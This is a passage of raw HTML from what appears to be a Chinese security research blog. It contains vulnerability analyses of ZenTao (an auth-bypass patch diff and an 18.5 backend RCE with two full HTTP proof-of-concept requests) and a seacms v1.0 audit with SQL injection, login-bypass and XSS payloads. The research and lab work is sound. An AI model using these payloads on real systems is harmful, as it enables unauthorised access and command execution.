class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><br><br></code></pre></td></tr></table></figure><p>综上，只需要testcase,savexmindimport和XMLHttpRequest参数满足即可，保证代码能够顺利实例化testcase的control，并且进入到deny，set添加user属性即可。</p><h3 id="代码differ"><a href="#代码differ" class="headerlink" title="代码differ"></a>代码differ</h3><p>下面针对补丁来进行分析。</p><p>身份验证绕过漏洞，要么是在给出cookie的时候出问题，要么是在拿到cookie之后，鉴权的时候出问题。</p><p>也就是如下两个url：</p><ul><li>&#x2F;zentao&#x2F;api.php?m&#x3D;testcase&amp;f&#x3D;savexmindimport&amp;HTTP_X_REQUESTED_WITH&#x3D;XMLHttpRequest</li><li>&#x2F;zentao&#x2F;api.php&#x2F;v1&#x2F;users</li></ul><h4 id="zentao-api-php-m-testcase-f-savexmindimport-HTTP-X-REQUESTED-WITH-XMLHttpRequest"><a href="#zentao-api-php-m-testcase-f-savexmindimport-HTTP-X-REQUESTED-WITH-XMLHttpRequest" class="headerlink" title="&#x2F;zentao&#x2F;api.php?m&#x3D;testcase&amp;f&#x3D;savexmindimport&amp;HTTP_X_REQUESTED_WITH&#x3D;XMLHttpRequest"></a>&#x2F;zentao&#x2F;api.php?m&#x3D;testcase&amp;f&#x3D;savexmindimport&amp;HTTP_X_REQUESTED_WITH&#x3D;XMLHttpRequest</h4><p>首先是&#x2F;zentao&#x2F;api.php?m&#x3D;testcase&amp;f&#x3D;savexmindimport&amp;HTTP_X_REQUESTED_WITH&#x3D;XMLHttpRequest，在前面已经分析过，在checkEntry中，$this-&gt;app-&gt;version为false，因此本来也不会进入if语句进行判断，此处修改并没有改变执行逻辑：</p><p><img src="/2023/04/27/file-upload/mage-20240506134415992.png" alt="image-20240506134415992"></p><p>下面是同一个文件中的checkNewEntry方法：</p><p><img src="/2023/04/27/file-upload/mage-20240506134809504.png" alt="image-20240506134809504"></p><p>commit之后，直接删除了checkNewEntry方法，而该方法仅仅是在checkEntry中，当$this-&gt;app-&gt;version为true时，会进行调用：</p><p><img src="/2023/04/27/file-upload/mage-20240506134738029.png" alt="image-20240506134738029"></p><p>此处改动也没有影响执行逻辑。</p><p>往下就到了startSession()：</p><p><img src="/2023/04/27/file-upload/mage-20240506135009514.png" alt="image-20240506135009514"></p><p>主要的改动是在if条件判断中，直接在代码中加入如下调试语句：</p><p><img src="/2023/04/27/file-upload/mage-20240506135132638.png" alt="image-20240506135132638"></p><p>再次访问后结果如下：</p><p><img src="/2023/04/27/file-upload/mage-20240506135229353.png" alt="image-20240506135229353"> </p><p>(isset($_GET[$this-&gt;config-&gt;sessionVar]))和(isset($_SERVER[‘HTTP_TOKEN’]))都为false，同样没有影响代码的执行逻辑。</p><p>最后一处commit在framework&#x2F;api&#x2F;entry.class.php中：</p><p><img src="/2023/04/27/file-upload/mage-20240506141311412.png" alt="image-20240506141311412"></p><p>分别在__construct()和checkPriv()方法中加入类似下面的调试语句：</p><p><img src="/2023/04/27/file-upload/mage-20240506141428829.png" alt="image-20240506141428829"></p><p>刷新之后并没有任何print，因此并没有调用这两个方法。</p><p>很明显，commit修改的部分，主要是在鉴权的阶段。</p><h4 id="zentao-api-php-v1-users"><a href="#zentao-api-php-v1-users" class="headerlink" title="&#x2F;zentao&#x2F;api.php&#x2F;v1&#x2F;users"></a>&#x2F;zentao&#x2F;api.php&#x2F;v1&#x2F;users</h4><p>在访问&#x2F;v1&#x2F;users时，$this-&gt;app-&gt;version为v1，因此会进入到checkNewEntry中，并且返回false。</p><p>而startSession和checkPriv同上，暂时跳过。</p><p>最后就剩下构造方法：</p><p><img src="/2023/04/27/file-upload/mage-20240506154119709.png" alt="image-20240506154119709"></p><p>存在漏洞的代码为：</p><p><code>if(!isset($this-&gt;app-&gt;user) or $this-&gt;app-&gt;user-&gt;account == &#39;guest&#39;) throw EndResponseException::create($this-&gt;sendError(401, &#39;Unauthorized&#39;));</code></p><p>而修改之后的代码为：</p><p><code>if(!isset($this-&gt;app-&gt;user-&gt;account) or $this-&gt;app-&gt;user-&gt;account == &#39;guest&#39;) throw EndResponseException::create($this-&gt;sendError(401, &#39;Unauthorized&#39;));</code></p><p>在代码中加上var_dump((bool)xxx)，刷新后查看：</p><p><img src="/2023/04/27/file-upload/mage-20240506154649127.png" alt="image-20240506154649127"></p><p>可以看到，在漏洞修复之后，if条件语句的值由false变为了true，成功走到了<code>throw EndResponseException::create($this-&gt;sendError(401, &#39;Unauthorized&#39;))</code>，抛出异常，并且返回了401未授权。</p><p>将原先的代码注释掉，跑一遍修复后的代码：</p><p><img src="/2023/04/27/file-upload/mage-20240506155010040.png" alt="image-20240506155010040"></p><p>401，unauthorized。</p><p>可见，问题就出在构造方法，在其中进行权限判断时出现了错误。</p><p>将$this-&gt;app-&gt;user打印出来：</p><p><img src="/2023/04/27/file-upload/mage-20240506155321292.png" alt="image-20240506155321292"></p><p>user对象存在，所以<code>!isset($this-&gt;app-&gt;user)</code>为false，而user-&gt;account为NULL，<code>$this-&gt;app-&gt;user-&gt;account == &#39;guest&#39;</code>也为false，导致整个condition为false，跳过了sendError。</p><p>而在修改之后，先检查了user-&gt;account是否存在，如果account不存在，或者account&#x3D;&#x3D;guest，就抛出异常，终止程序。</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>seacms_v1.0</title>
    <link href="/2024/07/23/seacms_v1.0/"/>
    <url>/2024/07/23/seacms_v1.0/</url>
    
    <content type="html"><![CDATA[<h1 id="seacms-v1-0"><a href="#seacms-v1-0" class="headerlink" title="seacms_v1.0"></a>seacms_v1.0</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a href="https://down.chinaz.com/soft/36930.htm">熊海CMS|熊海CMS v1.0下载_网站源码 - 站长源码 (chinaz.com)</a></p><p>win11</p><p>mysql 5.7.26</p><p>apache 2.4.39</p><p>php 5.6.9</p><p>vscode 1.18.1</p><p>如果遇到mysql函数报错：</p><p><img src="/2023/04/27/file-upload/-20230831085711835.png" alt="image-20230831085711835"></p><p>需要降低php版本，在高版本php中mysql_query()等函数被废弃，另外需要在插件中添加项mysql：</p><p><img src="/2023/04/27/file-upload/-20230831085817487.png" alt="image-20230831085817487"></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>首先查看一下目录结构：</p><p><img src="/2023/04/27/file-upload/-20230830225601824.png" alt="image-20230830225601824"></p><p>admin为管理员后台，files存放相关文件，install为安装路径，upload存放上传的文件，seacmseditor为编辑器文件夹。</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="根目录文件包含"><a href="#根目录文件包含" class="headerlink" title="根目录文件包含"></a>根目录文件包含</h4><p>首先根目录下仅有一个文件，index.php：</p><p><img src="/2023/04/27/file-upload/-20230830225946630.png" alt="image-20230830225946630"></p><p>这里通过GET接收一个参数r，如果r不为空，则通过include函数包含’files&#x2F;$r.php’文件。</p><p>在files文件夹下新建一个phpinfo.php文件，内容为<code>&lt;?php phpinfo(); ?&gt;</code> 直接拼接url：</p><p><img src="/2023/04/27/file-upload/-20230830230122150.png" alt="image-20230830230122150"></p><p>存在漏洞。</p><h4 id="admin-index-php文件包含"><a href="#admin-index-php文件包含" class="headerlink" title="admin&#x2F;index.php文件包含"></a>admin&#x2F;index.php文件包含</h4><p>代码相同，同样的漏洞和触发方式：</p><p><img src="/2023/04/27/file-upload/-20230831094317148.png" alt="image-20230831094317148"></p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="install处update注入"><a href="#install处update注入" class="headerlink" title="install处update注入"></a>install处update注入</h4><p>借助seay工具，判断出install&#x2F;index.php处存在sql注入，进代码查看:</p><p><img src="/2023/04/27/file-upload/-20230831093714957.png" alt="image-20230831093714957"></p><p>这里将user直接拼接进了sql语句，虽然有单引号，但是并未对输入进行过滤处理，直接闭合即可，删除安装目录下的lock文件，重新安装，输入payload：</p><p><code>1&#39; and updatexml(1,concat(0x7e,(version())),0)#</code></p><p><img src="/2023/04/27/file-upload/-20230831093842725.png" alt="image-20230831093842725"></p><p>报错注入成功注出版本信息：</p><p><img src="/2023/04/27/file-upload/-20230831093905671.png" alt="image-20230831093905671"></p><h4 id="admin-login-sql注入"><a href="#admin-login-sql注入" class="headerlink" title="admin&#x2F;login sql注入"></a>admin&#x2F;login sql注入</h4><p>访问admin，跳转到file&#x2F;login.php文件，也就是登录页面：</p><p><img src="/2023/04/27/file-upload/-20230831134713276.png" alt="image-20230831134713276"></p><p>这里的user参数未做任何过滤，直接拼接，并且是用户可控，存在sql注入。</p><p>mysql_error开启，报错注入，payload为<code>admin&#39; and updatexml(1,(concat(0x7e,(version()))),0)#</code>:</p><p><img src="/2023/04/27/file-upload/-20230831134827554.png" alt="image-20230831134827554"></p><p>get</p><h4 id="admin-files-softlist-sql注入"><a href="#admin-files-softlist-sql注入" class="headerlink" title="admin&#x2F;files&#x2F;softlist sql注入"></a>admin&#x2F;files&#x2F;softlist sql注入</h4><p>同理，无过滤，delete参数可控，报错注入：</p><p><img src="/2023/04/27/file-upload/-20230831135532894.png" alt="image-20230831135532894"></p><p><img src="/2023/04/27/file-upload/-20230831135452082.png" alt="image-20230831135452082"></p><h4 id="file-content-sql注入"><a href="#file-content-sql注入" class="headerlink" title="file&#x2F;content sql注入"></a>file&#x2F;content sql注入</h4><p>在content.php页面，存在一个前台注入，到代码中查看：</p><p><img src="/2023/04/27/file-upload/-20230901094302505.png" alt="image-20230901094302505"></p><p>get传入的cid的值经过了addslashes过滤，因此前两个query无法注入，但是在浏览计数时，id并未被引号包裹，存在注入，mysql_error开启，同样是报错注入：</p><p><img src="/2023/04/27/file-upload/-20230901094415453.png" alt="image-20230901094415453"></p><p>还存在很多同样原理和类型的注入，不再一一列举。</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>file&#x2F;contact.php中：</p><p><img src="/2023/04/27/file-upload/-20230901114837088.png" alt="image-20230901114837088"></p><p>这里page通过get传入，进行了addslashes过滤，就进行了输出，直接插入payload：</p><p><img src="/2023/04/27/file-upload/-20230901114941977.png" alt="image-20230901114941977"></p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>存储型xss一般出现在留言评论处，先找到功能点：</p><p><img src="/2023/04/27/file-upload/-20230901131751645.png" alt="image-20230901131751645"></p><p>写一条评论：</p><p><img src="/2023/04/27/file-upload/-20230901132951937.png" alt="image-20230901132951937"></p><p>发现只有name显示在页面上，来跟踪test这个参数的引用：</p><p><img src="/2023/04/27/file-upload/-20230901133027075.png" alt="image-20230901133027075"></p><p>直接将name变量插入了数据库，往前搜索，通过post方法传入，未进行任何过滤：</p><p><img src="/2023/04/27/file-upload/-20230901133312351.png" alt="image-20230901133312351"></p><p>插入payload：</p><p><img src="/2023/04/27/file-upload/-20230901133909938.png" alt="image-20230901133909938"></p><p>GET！</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>一些页面需要后台登录后才能查看，例如编辑软件，editsoft，查看代码：</p><p><img src="/2023/04/27/file-upload/-20230901113810203.png" alt="image-20230901113810203"></p><p>包含了checklogin.php，根据命名判断应该是鉴权的文件：</p><p><img src="/2023/04/27/file-upload/-20230901114145873.png" alt="image-20230901114145873"></p><p>如果cookie中user的值不为空即可：</p><p><img src="/2023/04/27/file-upload/-20230901114457114.png" alt="image-20230901114457114"></p><p>加上cookie，user为任意值，即可查看后台内容。</p><h3 id="万能密码登录"><a href="#万能密码登录" class="headerlink" title="万能密码登录"></a>万能密码登录</h3><p>前面提到，在admin&#x2F;login也就是后台登录页面，user参数存在sql注入漏洞，这里的校验逻辑有缺陷，可以造成万能密码登录。</p><p><img src="/2023/04/27/file-upload/-20230901112529405.png" alt="image-20230901112529405"></p><p>首先是user参数，未过滤直接拼接，校验密码时，将password参数进行了md5编码，再进行对比，如果相同，则成功登录。</p><p><img src="/2023/04/27/file-upload/-20230901112636497.png" alt="image-20230901112636497"></p><p>首先查看数据库，8个字段，这里进行联合注入：</p><p><img src="/2023/04/27/file-upload/-20230901112855118.png" alt="image-20230901112855118"></p><p>先获取ry4n的md5值，再通过union select插入，就满足了md5($password)&#x3D;&#x3D;$passwords：</p><p><code>user=&#39; union select 1,2,&#39;ry4n&#39;,&#39;9eb0337e52170124ec0854dd7e30c5cd&#39;,5,6,7,8#&amp;password=ry4n&amp;login=yes</code></p><p><img src="/2023/04/27/file-upload/-20230901113213974.png" alt="image-20230901113213974"></p><p>成功登录后台。这里其实只需要第四个字段为md5值即可，其他任意。</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>这里可以通过文件包含漏洞，写入图片马等，进行getshell，代码为<code>include(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件</code>，这里绕过目录限制可以利用..&#x2F;，绕过后缀限制可以利用%00，或者超长字符截断，但是需要低版本的php。</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>禅道项目管理系统18.5后台RCE</title>
    <link href="/2024/07/23/%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F18.5%E5%90%8E%E5%8F%B0RCE/"/>
    <url>/2024/07/23/%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F18.5%E5%90%8E%E5%8F%B0RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="禅道项目管理系统18-5后台RCE"><a href="#禅道项目管理系统18-5后台RCE" class="headerlink" title="禅道项目管理系统18.5后台RCE"></a>禅道项目管理系统18.5后台RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在看各漏洞源更新时，发现禅道18.5爆出了一个新的RCE，poc有两个请求，分别如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/zentaopms/www/index.php?m=custom&amp;f=ajaxSaveCustomFields&amp;module=common§ion=features&amp;key=apiGetModel</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.234.128<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.234.128<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.234.128/zentaopms/www/index.php?m=projectstory&amp;f=story&amp;projectID=1<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>zentaosid=t33hnj6nnkdkjcid7rp3bdl63e;<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-ini"><span class="hljs-attr">fields</span>=<span class="hljs-literal">true</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/zentaopms/www/index.php?m=api&amp;f=getModel&amp;moduleName=repo&amp;methodName=checkConnection</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.234.128<br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.234.128/zentaopms/www/index.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>zentaosid=t33hnj6nnkdkjcid7rp3bdl63e;<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>30<br><br><span class="language-ini"><span class="hljs-attr">client</span>=calc.exe&amp;SCM=Subversion</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/age-20240620164926479.png" alt="image-20240620164926479"></p><p>请求之后并没有执行命令，提示apiGetModel被禁用，直接到config目录下找找：</p><p><img src="/2023/04/27/file-upload/age-20240620165052928.png" alt="image-20240620165052928"></p><p>在config.php中，默认$config-&gt;features-&gt;apiGetModel是false，这里改为true，再次执行第二个请求，成功弹出了计算器。</p><p>至此，以为该漏洞需要受害者手动修改默认配置，才能进行利用，非常鸡肋，但是想到第一个请求似乎没有任何作用，于是打算仔细分析一下两个poc以及整个利用过程。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>调试环境搭建部分具体可见：</p><p><a href="https://mp.weixin.qq.com/s/qOlAplk_i66WRJ1Zf9ZWAw">phpstorm+xdebug调试环境搭建</a></p><p>zentaopms v18.5源码下载：</p><p><a href="https://www.zentao.net/download/zentaopms18.5-82695.html">禅道18.5发布啦！优化常用列表的性能，修复Bug - 禅道下载 - 禅道开源项目管理软件 (zentao.net)</a></p><p><img src="/2023/04/27/file-upload/age-20240620163849276.png" alt="image-20240620163849276"></p><p>根据不同php版本下载对应安装包即可。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在修改配置之后，能够成功执行命令，就先分析第二个请求。</p><p>直接看一下命令执行的触发过程。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /zentaopms/www/index.php?m=api&amp;f=getModel&amp;moduleName=repo&amp;methodName=checkConnection<br>...<br>...<br>client=calc.exe&amp;SCM=Subversion<br></code></pre></td></tr></table></figure><p>首先看&#x2F;zentaopms&#x2F;www&#x2F;index.php：</p><p><img src="/2023/04/27/file-upload/age-20240620165820477.png" alt="image-20240620165820477"></p><p>前面都是与安装，更新相关的判断，直接跳过，到最后几行分别打上断点，借此判断从哪里步入。</p><p>这里让浏览器走burp的代理，在repeater中发送poc：</p><p><img src="/2023/04/27/file-upload/age-20240620170319435.png" alt="image-20240620170319435"></p><p>如图，成功断住，往下不断执行：</p><p><img src="/2023/04/27/file-upload/age-20240620170628537.png" alt="image-20240620170628537"></p><p>在最后一个断点之后，继续执行，弹出计算器，因此步入<code>echo $app-&gt;outputPage();</code></p><p><strong>tips:在测试中发现，如果直接把get请求改为poc，无法成功执行命令，比较两个request发现poc中必须带有referer头</strong></p><p><img src="/2023/04/27/file-upload/age-20240620171057346.png" alt="image-20240620171057346"></p><p>步入跟进之后发现，$this-&gt;loadModule执行之后，命令就被成功执行，继续步入：</p><p><img src="/2023/04/27/file-upload/age-20240620171203959.png" alt="image-20240620171203959"></p><p>跟到loadModule函数的<code>call_user_function_array</code>，<code>call_user_func_array(array($module, $this-&gt;methodName), $this-&gt;params);</code>这里调用了$module的$this-&gt;methodName方法，并且将$this-&gt;params作为参数传入。</p><p><img src="/2023/04/27/file-upload/age-20240620171720531.png" alt="image-20240620171720531"></p><p>params为一个数组，moduleName和MethodName通过url传入，而$this-&gt;methodName为getmodel。</p><p>步入：</p><p><img src="/2023/04/27/file-upload/age-20240620172044063.png" alt="image-20240620172044063"></p><p>在877行执行之后就会弹出计算器，打断点，此时的methodName为checkConnection，这里应该是调用了module的checkConnection方法，无参。继续步入：</p><p><img src="/2023/04/27/file-upload/age-20240620172545159.png" alt="image-20240620172545159"></p><p>下面到了最关键的部分，checkConnection函数。如果scm&#x3D;&#x3D;’Subversion’，就会执行一个exec，而执行的命令为<code>$client --version --quiet 2&gt;&amp;1</code>，$client即为post中传入的client，如果post body为<code>client=calc.exe&amp;SCM=Subversion</code>，就能成功进入if语句，并且拼接命令，执行<code>calc.exe --version --quiet 2&gt;&amp;1</code>，弹出计算器。</p><p>步过：</p><p><img src="/2023/04/27/file-upload/age-20240620172907032.png" alt="image-20240620172907032"></p><p>成功执行。</p><p>但是在不打断点的情况下，通过poc会执行两次命令，继续步过查看：</p><p><img src="/2023/04/27/file-upload/age-20240620172950409.png" alt="image-20240620172950409"></p><p>在1551行同样有一个exec，其中$command均是由$client拼接而成，跟前者类似，到这里漏洞的触发点已经明确了。</p><p>由此尝试往前进行推导，发现大都是通过<code>call_user_function_array</code>进行调用，并且模块较多，暂不查找其他利用方式，仅针对poc进行分析。</p><p>整个的调用链如下：</p><p><img src="/2023/04/27/file-upload/age-20240620175524507.png" alt="image-20240620175524507"></p><p>下面来分析不修改config配置时的情况。</p><p>在简单的debug之后发现，在getModel中，开头的一个if判断，由于apiGetModel为false，就直接返回了错误信息，因此没能往下执行到checkConnection，进而调用exec()执行命令：</p><p><img src="/2023/04/27/file-upload/age-20240620180451505.png" alt="image-20240620180451505"></p><p>关键就在于<code>$config-&gt;features-&gt;apiGetModel</code>配置项是否打开，如果打开即可执行命令，但是默认情况下为关闭。</p><p>结合第一个poc中<code>key=apiGetModel</code>，<code>field=true</code>，应该是在修改配置，下面进代码进行分析。</p><p>在整个index.php中，主要有如下几行代码：</p><p><img src="/2023/04/27/file-upload/age-20240621101247925.png" alt="image-20240621101247925"></p><p>1、加载</p><p>2、解析请求</p><p>3、设置参数</p><p>如果直接发送第一个poc的请求(其实哪个请求都可以，主要为了看config在哪里配置)，会在第72行return。</p><p><img src="/2023/04/27/file-upload/age-20240621101417998.png" alt="image-20240621101417998"></p><p>往前一步下断点，此时apiGetModel已经是false，继续往前断，到loadCommon():</p><p><img src="/2023/04/27/file-upload/age-20240621101721238.png" alt="image-20240621101721238"></p><p>这里依然已经是false，但是前面都是无关代码，跟进步入：</p><p><img src="/2023/04/27/file-upload/age-20240621101812321.png" alt="image-20240621101812321"></p><p>baseRouter中的loadCommon，最终return new extCommonModel。</p><p>跟进：</p><p><img src="/2023/04/27/file-upload/age-20240621102111602.png" alt="image-20240621102111602"></p><p>在构造方法中，唯一跟config有关的就是loadConfigFromDB，打断点步入：</p><p><img src="/2023/04/27/file-upload/age-20240624145601397.png" alt="image-20240624145601397"></p><p>loadConfigFromDB函数中，会首先从配置文件中读取配置信息，然后到mergeConfig：</p><p><img src="/2023/04/27/file-upload/age-20240624145924977.png" alt="image-20240624145924977"></p><p>这里的config为全局变量，会从数据库读取配置项进行覆盖。因此，只要能覆盖apiGetModel，使其为true，即可在默认配置为false的情况下，实现命令执行。</p><p>下面分析如何覆盖。</p><p>先查看数据库中的内容，结合config.php：</p><p><img src="/2023/04/27/file-upload/age-20240624161300293.png" alt="image-20240624161300293"></p><p>如果要覆盖apiGetModel参数，就要使得module为common，section为features，key为apiGetModel，然后在loadCommon时，在构造方法中调用mergeConfig即可。</p><p>继续看下代码的commit:<a href="https://github.com/easysoft/zentaopms/commit/24b3fba6c0077bfc7bcc94af505d43856377186b">+ custom: limit the items user can save to db to prevent command exec… · easysoft&#x2F;zentaopms@24b3fba (github.com)</a></p><p><img src="/2023/04/27/file-upload/age-20240624151115116.png" alt="image-20240624151115116"></p><p>最主要的改动在于control.php中的ajaxSaveCustomFields方法，而poc_1中也是利用了该方法<code>/zentaopms/www/index.php?m=custom&amp;f=ajaxSaveCustomFields&amp;module=common§ion=features&amp;key=apiGetModel</code></p><p>定位到该函数：</p><p><img src="/2023/04/27/file-upload/age-20240624151359856.png" alt="image-20240624151359856"></p><p>获取账户信息之后，从POST请求中读取fields值，再进行自定义内容的修改。因此，只要先通过该方法，将apiGetModel修改为true，再通过mergeConfig从数据库读取参数值进行覆盖即可。</p><p>直接搜索：</p><p><img src="/2023/04/27/file-upload/age-20240624162654731.png" alt="image-20240624162654731"></p><p>都是在html.php中，没有有效信息，应该都是通过call的方式进行调用。</p><p>尝试直接构造一个请求来调用该方法：</p><p><img src="/2023/04/27/file-upload/age-20240624163657675.png" alt="image-20240624163657675"></p><p>调用custom下的ajaxSaveCustomFields，module，section和key的值在前面已经都分析过，发送请求之后成功断住：</p><p><img src="/2023/04/27/file-upload/age-20240624163632348.png" alt="image-20240624163632348"></p><p>在执行setItem之后，到数据库中查看：</p><p><img src="/2023/04/27/file-upload/age-20240624163615166.png" alt="image-20240624163615166"></p><p>已经多了一条数据。</p><p>在mergeConfig下断点：</p><p><img src="/2023/04/27/file-upload/age-20240624164228339.png" alt="image-20240624164228339"></p><p>可以看到，此时person的配置里，已经出现了刚刚添加的一条数据，并且值为true，但是此时$this-&gt;config-&gt;features-&gt;apiGetModel依然为false（从配置文件读取的）。</p><p>继续往下，当把这条数据覆盖掉之后，$this-&gt;config-&gt;features-&gt;apiGetModel变成了true：</p><p><img src="/2023/04/27/file-upload/age-20240624164344919.png" alt="image-20240624164344919"></p><p>下面发送poc_2:</p><p><img src="/2023/04/27/file-upload/age-20240624165147119.png" alt="image-20240624165147119"></p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpstorm+xdebug调试环境搭建</title>
    <link href="/2024/07/23/phpstorm+xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/07/23/phpstorm+xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="phpstorm-xdebug调试环境搭建"><a href="#phpstorm-xdebug调试环境搭建" class="headerlink" title="phpstorm+xdebug调试环境搭建"></a>phpstorm+xdebug调试环境搭建</h1><h2 id="软件版本"><a href="#软件版本" class="headerlink" title="软件版本"></a>软件版本</h2><ul><li>phpstudy 8.1.1.3（php8.0.2+xdebug3.0.3）</li><li>phpstorm 2024.1.1</li></ul><h2 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h2><p>phpstudy中安装扩展xdebug：</p><p><img src="/2023/04/27/file-upload/-20240520132525607.png" alt="image-20240520132525607"></p><p>php.ini配置如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Xdebug]</span><br><span class="hljs-attr">zend_extension</span>=D:/phpstudy_pro/Extensions/php/php8.<span class="hljs-number">0.2</span>nts/ext/php_xdebug.dll<br><span class="hljs-attr">xdebug.collect_params</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.colletc_return</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.auto_trace</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">122.1</span><br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9002</span><br><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<br><span class="hljs-attr">xdebug.idkey</span>=<span class="hljs-string">&quot;PHPSTORM&quot;</span><br><span 